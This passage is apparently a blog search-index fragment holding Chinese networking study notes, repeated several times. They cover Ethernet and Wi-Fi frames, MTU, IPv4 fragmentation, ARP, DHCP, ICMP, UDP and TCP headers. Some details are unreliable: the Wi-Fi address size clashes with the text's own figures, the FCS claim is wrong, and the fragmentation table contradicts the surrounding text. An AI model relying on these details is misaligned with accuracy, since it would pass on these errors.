地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#arprarp-协议"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#dhcp-协议"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#icmp-协议"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#传输层"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 